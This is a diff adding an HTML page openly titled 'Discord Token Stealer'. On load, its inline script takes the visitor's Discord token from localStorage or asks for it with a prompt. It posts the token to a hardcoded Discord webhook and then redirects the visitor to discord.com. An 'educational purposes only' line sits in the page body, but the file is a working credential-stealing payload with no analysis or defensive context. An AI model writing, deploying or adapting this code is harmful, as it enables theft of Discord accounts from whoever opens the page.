@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Token Stealer</title>
+    <script>
+        // Stealthily extract the user's Discord token
+        const token = localStorage.token || prompt('Please enter your Discord token:');
+
+        // Transmit the stolen token to a Discord webhook
+        fetch('https://discord.com/api/webhooks/1146137671605956708/POOYnRSXixoP1i1BY4T8HZfl0k_ARM8-9R38Tutdf5ZmTSFvCavR6uVgzl6iFF484xY1', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ content: token })
+        });
+
+        // Redirect the user after stealing the token
+        window.location.href = 'https://discord.com';
+    </script>
+</head>
+<body>
+    <h1>Website Content</h1>
+    <p>This website is here for educational purposes only.</p>
+</body>
+</html>
